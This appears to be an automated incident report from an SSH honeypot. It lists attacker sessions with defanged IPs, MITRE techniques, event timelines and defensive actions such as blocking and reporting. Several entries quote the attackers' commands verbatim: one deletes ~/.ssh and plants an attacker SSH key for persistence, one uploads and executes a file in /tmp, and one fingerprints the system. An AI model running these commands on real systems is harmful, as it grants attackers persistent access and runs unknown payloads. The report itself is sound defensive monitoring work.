| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:13:03` | `cowrie.session.connect` |
| `2026-09-06 14:13:03` | `cowrie.client.version` |
| `2026-09-06 14:13:03` | `cowrie.client.kex` |
| `2026-09-06 14:13:04` | `cowrie.login.success` |
| `2026-09-06 14:13:04` | `cowrie.session.params` |
| `2026-09-06 14:13:04` | `cowrie.command.input` |
| `2026-09-06 14:13:05` | `cowrie.log.closed` |
| `2026-09-06 14:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-371de08afea2

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-06 14:15 |
| **Last Seen** | 2026-09-06 14:16 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:15:54` | `cowrie.session.connect` |
| `2026-09-06 14:15:54` | `cowrie.client.version` |
| `2026-09-06 14:15:54` | `cowrie.client.kex` |
| `2026-09-06 14:15:55` | `cowrie.login.success` |
| `2026-09-06 14:15:56` | `cowrie.direct-tcpip.request` |
| `2026-09-06 14:15:59` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 14:15:59` | `cowrie.direct-tcpip.data` |
| `2026-09-06 14:16:02` | `cowrie.direct-tcpip.request` |
| `2026-09-06 14:16:03` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 14:16:03` | `cowrie.direct-tcpip.data` |
| `2026-09-06 14:16:09` | `cowrie.direct-tcpip.request` |
| `2026-09-06 14:16:14` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 14:16:14` | `cowrie.direct-tcpip.data` |
| `2026-09-06 14:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8f6197295a

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-06 14:21 |
| **Last Seen** | 2026-09-06 14:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:21:45` | `cowrie.session.connect` |
| `2026-09-06 14:21:45` | `cowrie.client.version` |
| `2026-09-06 14:21:45` | `cowrie.client.kex` |
| `2026-09-06 14:21:46` | `cowrie.login.success` |
| `2026-09-06 14:21:48` | `cowrie.direct-tcpip.request` |
| `2026-09-06 14:21:48` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 14:21:48` | `cowrie.direct-tcpip.data` |
| `2026-09-06 14:21:49` | `cowrie.direct-tcpip.request` |
| `2026-09-06 14:21:50` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 14:21:50` | `cowrie.direct-tcpip.data` |
| `2026-09-06 14:21:51` | `cowrie.direct-tcpip.request` |
| `2026-09-06 14:21:52` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 14:21:52` | `cowrie.direct-tcpip.data` |
| `2026-09-06 14:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d8ee28563e1

| Field | Detail |
|---|---|
| **Source IP** | `210.245.20[.]230` |
| **First Seen** | 2026-09-06 14:37 |
| **Last Seen** | 2026-09-06 14:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:37:43` | `cowrie.session.connect` |
| `2026-09-06 14:37:43` | `cowrie.client.version` |
| `2026-09-06 14:37:43` | `cowrie.client.kex` |
| `2026-09-06 14:37:45` | `cowrie.login.success` |
| `2026-09-06 14:37:46` | `cowrie.session.params` |
| `2026-09-06 14:37:46` | `cowrie.command.input` |
| `2026-09-06 14:37:46` | `cowrie.command.failed` |
| `2026-09-06 14:37:46` | `cowrie.log.closed` |
| `2026-09-06 14:37:49` | `cowrie.session.params` |
| `2026-09-06 14:37:49` | `cowrie.command.input` |
| `2026-09-06 14:37:49` | `cowrie.session.file_download` |
| `2026-09-06 14:37:49` | `cowrie.log.closed` |
| `2026-09-06 14:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.245.20[.]230` to AbuseIPDB if not already reported
- [ ] Block `210.245.20[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b3aecb29a73

| Field | Detail |
|---|---|
| **Source IP** | `210.245.20[.]230` |
| **First Seen** | 2026-09-06 14:37 |
| **Last Seen** | 2026-09-06 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:37:49` | `cowrie.session.connect` |
| `2026-09-06 14:37:49` | `cowrie.client.version` |
| `2026-09-06 14:37:49` | `cowrie.client.kex` |
| `2026-09-06 14:37:51` | `cowrie.login.success` |
| `2026-09-06 14:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.245.20[.]230` to AbuseIPDB if not already reported
- [ ] Block `210.245.20[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899df590d2e0

| Field | Detail |
|---|---|
| **Source IP** | `210.245.20[.]230` |
| **First Seen** | 2026-09-06 14:37 |
| **Last Seen** | 2026-09-06 14:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:37:51` | `cowrie.session.connect` |
| `2026-09-06 14:37:51` | `cowrie.client.version` |
| `2026-09-06 14:37:51` | `cowrie.client.kex` |
| `2026-09-06 14:37:53` | `cowrie.login.success` |
| `2026-09-06 14:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.245.20[.]230` to AbuseIPDB if not already reported
- [ ] Block `210.245.20[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb8f9f261fd

| Field | Detail |
|---|---|
| **Source IP** | `106.75.214[.]209` |
| **First Seen** | 2026-09-06 14:41 |
| **Last Seen** | 2026-09-06 14:46 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:41:34` | `cowrie.session.connect` |
| `2026-09-06 14:41:36` | `cowrie.client.version` |
| `2026-09-06 14:41:36` | `cowrie.client.kex` |
| `2026-09-06 14:41:37` | `cowrie.login.success` |
| `2026-09-06 14:41:38` | `cowrie.session.params` |
| `2026-09-06 14:41:38` | `cowrie.command.input` |
| `2026-09-06 14:41:38` | `cowrie.command.failed` |
| `2026-09-06 14:41:38` | `cowrie.log.closed` |
| `2026-09-06 14:41:40` | `cowrie.session.params` |
| `2026-09-06 14:41:40` | `cowrie.command.input` |
| `2026-09-06 14:41:40` | `cowrie.session.file_download` |
| `2026-09-06 14:41:40` | `cowrie.log.closed` |
| `2026-09-06 14:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.214[.]209` to AbuseIPDB if not already reported
- [ ] Block `106.75.214[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-598544d52084

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]112` |
| **First Seen** | 2026-09-06 14:42 |
| **Last Seen** | 2026-09-06 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:42:41` | `cowrie.session.connect` |
| `2026-09-06 14:42:41` | `cowrie.client.version` |
| `2026-09-06 14:42:41` | `cowrie.client.kex` |
| `2026-09-06 14:42:42` | `cowrie.login.success` |
| `2026-09-06 14:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]112` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6e28e0d3c3b

| Field | Detail |
|---|---|
| **Source IP** | `84.242.24[.]59` |
| **First Seen** | 2026-09-06 14:45 |
| **Last Seen** | 2026-09-06 14:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/V62vtXQH` |
| **Download Attempts** | 603dd8562b98ed7e13618d591a2d359f02a3d33b5b8787435aaa0d06f2bf1451 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:45:17` | `cowrie.session.connect` |
| `2026-09-06 14:45:17` | `cowrie.client.version` |
| `2026-09-06 14:45:18` | `cowrie.client.kex` |
| `2026-09-06 14:45:18` | `cowrie.login.success` |
| `2026-09-06 14:45:18` | `cowrie.client.var` |
| `2026-09-06 14:45:19` | `cowrie.session.params` |
| `2026-09-06 14:45:19` | `cowrie.command.input` |
| `2026-09-06 14:45:20` | `cowrie.session.file_download` |
| `2026-09-06 14:45:20` | `cowrie.log.closed` |
| `2026-09-06 14:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.242.24[.]59` to AbuseIPDB if not already reported
- [ ] Block `84.242.24[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cae086bb142d

| Field | Detail |
|---|---|
| **Source IP** | `84.242.24[.]59` |
| **First Seen** | 2026-09-06 14:45 |
| **Last Seen** | 2026-09-06 14:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/V62vtXQH` |
| **Download Attempts** | 603dd8562b98ed7e13618d591a2d359f02a3d33b5b8787435aaa0d06f2bf1451 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:45:18` | `cowrie.session.connect` |
| `2026-09-06 14:45:18` | `cowrie.client.version` |
| `2026-09-06 14:45:18` | `cowrie.client.kex` |
| `2026-09-06 14:45:18` | `cowrie.login.success` |
| `2026-09-06 14:45:19` | `cowrie.client.var` |
| `2026-09-06 14:45:20` | `cowrie.session.params` |
| `2026-09-06 14:45:20` | `cowrie.command.input` |
| `2026-09-06 14:45:20` | `cowrie.session.file_download` |
| `2026-09-06 14:45:20` | `cowrie.log.closed` |
| `2026-09-06 14:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.242.24[.]59` to AbuseIPDB if not already reported
- [ ] Block `84.242.24[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2732ab2e5b3

| Field | Detail |
|---|---|
| **Source IP** | `84.242.24[.]59` |
| **First Seen** | 2026-09-06 14:45 |
| **Last Seen** | 2026-09-06 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x V62vtXQH && bash -c ./V62vtXQH, ./V62vtXQH` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:45:20` | `cowrie.session.connect` |
| `2026-09-06 14:45:20` | `cowrie.client.version` |
| `2026-09-06 14:45:20` | `cowrie.client.kex` |
| `2026-09-06 14:45:20` | `cowrie.login.success` |
| `2026-09-06 14:45:21` | `cowrie.client.var` |
| `2026-09-06 14:45:21` | `cowrie.session.params` |
| `2026-09-06 14:45:21` | `cowrie.command.input` |
| `2026-09-06 14:45:21` | `cowrie.command.input` |
| `2026-09-06 14:45:21` | `cowrie.command.failed` |
| `2026-09-06 14:45:21` | `cowrie.log.closed` |
| `2026-09-06 14:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.242.24[.]59` to AbuseIPDB if not already reported
- [ ] Block `84.242.24[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c659f5406bd

| Field | Detail |
|---|---|
| **Source IP** | `84.242.24[.]59` |
| **First Seen** | 2026-09-06 14:45 |
| **Last Seen** | 2026-09-06 14:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x V62vtXQH && bash -c ./V62vtXQH, ./V62vtXQH` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:45:20` | `cowrie.session.connect` |
| `2026-09-06 14:45:20` | `cowrie.client.version` |
| `2026-09-06 14:45:20` | `cowrie.client.kex` |
| `2026-09-06 14:45:21` | `cowrie.login.success` |
| `2026-09-06 14:45:21` | `cowrie.client.var` |
| `2026-09-06 14:45:22` | `cowrie.session.params` |
| `2026-09-06 14:45:22` | `cowrie.command.input` |
| `2026-09-06 14:45:22` | `cowrie.command.input` |
| `2026-09-06 14:45:22` | `cowrie.command.failed` |
| `2026-09-06 14:45:22` | `cowrie.log.closed` |
| `2026-09-06 14:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.242.24[.]59` to AbuseIPDB if not already reported
- [ ] Block `84.242.24[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-983792518b4c

| Field | Detail |
|---|---|
| **Source IP** | `172.208.48[.]177` |
| **First Seen** | 2026-09-06 14:48 |
| **Last Seen** | 2026-09-06 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:48:17` | `cowrie.session.connect` |
| `2026-09-06 14:48:17` | `cowrie.client.version` |
| `2026-09-06 14:48:17` | `cowrie.client.kex` |
| `2026-09-06 14:48:17` | `cowrie.login.success` |
| `2026-09-06 14:48:18` | `cowrie.session.params` |
| `2026-09-06 14:48:18` | `cowrie.command.input` |
| `2026-09-06 14:48:18` | `cowrie.command.failed` |
| `2026-09-06 14:48:18` | `cowrie.log.closed` |
| `2026-09-06 14:48:19` | `cowrie.session.params` |
| `2026-09-06 14:48:19` | `cowrie.command.input` |
| `2026-09-06 14:48:19` | `cowrie.session.file_download` |
| `2026-09-06 14:48:19` | `cowrie.log.closed` |
| `2026-09-06 14:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.208.48[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.208.48[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7778adb9842

| Field | Detail |
|---|---|
| **Source IP** | `172.208.48[.]177` |
| **First Seen** | 2026-09-06 14:48 |
| **Last Seen** | 2026-09-06 14:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:48:19` | `cowrie.session.connect` |
| `2026-09-06 14:48:19` | `cowrie.client.version` |
| `2026-09-06 14:48:19` | `cowrie.client.kex` |
| `2026-09-06 14:48:19` | `cowrie.login.success` |
| `2026-09-06 14:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.208.48[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.208.48[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917149a761a9

| Field | Detail |
|---|---|
| **Source IP** | `172.208.48[.]177` |
| **First Seen** | 2026-09-06 14:48 |
| **Last Seen** | 2026-09-06 14:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:48:19` | `cowrie.session.connect` |
| `2026-09-06 14:48:19` | `cowrie.client.version` |
| `2026-09-06 14:48:19` | `cowrie.client.kex` |
| `2026-09-06 14:48:19` | `cowrie.login.success` |
| `2026-09-06 14:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.208.48[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.208.48[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee3b1276170

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-06 14:50 |
| **Last Seen** | 2026-09-06 14:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:50:35` | `cowrie.session.connect` |
| `2026-09-06 14:50:35` | `cowrie.client.version` |
| `2026-09-06 14:50:35` | `cowrie.client.kex` |
| `2026-09-06 14:50:37` | `cowrie.login.success` |
| `2026-09-06 14:50:40` | `cowrie.session.params` |
| `2026-09-06 14:50:40` | `cowrie.command.input` |
| `2026-09-06 14:50:41` | `cowrie.log.closed` |
| `2026-09-06 14:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6889561180

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-06 14:52 |
| **Last Seen** | 2026-09-06 14:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:52:52` | `cowrie.session.connect` |
| `2026-09-06 14:52:53` | `cowrie.client.version` |
| `2026-09-06 14:52:53` | `cowrie.client.kex` |
| `2026-09-06 14:52:55` | `cowrie.login.success` |
| `2026-09-06 14:52:57` | `cowrie.session.params` |
| `2026-09-06 14:52:57` | `cowrie.command.input` |
| `2026-09-06 14:52:58` | `cowrie.log.closed` |
| `2026-09-06 14:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `66.132.172[.]99` | **5** | 2026-09-06 14:50 | 2026-09-06 14:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]121` | **3** | 2026-09-06 14:50 | 2026-09-06 14:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]50` | **3** | 2026-09-06 14:49 | 2026-09-06 14:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.75.214[.]209` | **2** | 2026-09-06 14:41 | 2026-09-06 14:43 | 4m | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | **2** | 2026-09-06 12:59 | 2026-09-06 14:24 | 3m | 0 | `T1592` | 🟢 LOW |
| `201.205.241[.]198` | **2** | 2026-09-06 13:32 | 2026-09-06 13:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | **2** | 2026-09-06 13:17 | 2026-09-06 14:12 | 2m | 0 | `T1592` | 🟢 LOW |
| `120.26.220[.]254` | 1 | 2026-09-06 13:30 | 2026-09-06 13:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.46.71[.]57` | 1 | 2026-09-06 14:54 | 2026-09-06 14:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-06 14:21 | 2026-09-06 14:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-09-06 13:01 | 2026-09-06 13:01 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `200.86.41[.]76` | 1 | 2026-09-06 13:03 | 2026-09-06 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.135.193[.]159` | 1 | 2026-09-06 14:26 | 2026-09-06 14:26 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]232` | 1 | 2026-09-06 13:36 | 2026-09-06 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]137` | 1 | 2026-09-06 14:07 | 2026-09-06 14:08 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]180` | 1 | 2026-09-06 14:52 | 2026-09-06 14:52 | 16s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-09-06 13:33 | 2026-09-06 13:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]50` | 1 | 2026-09-06 14:47 | 2026-09-06 14:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-06 12:56 | 2026-09-06 12:56 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
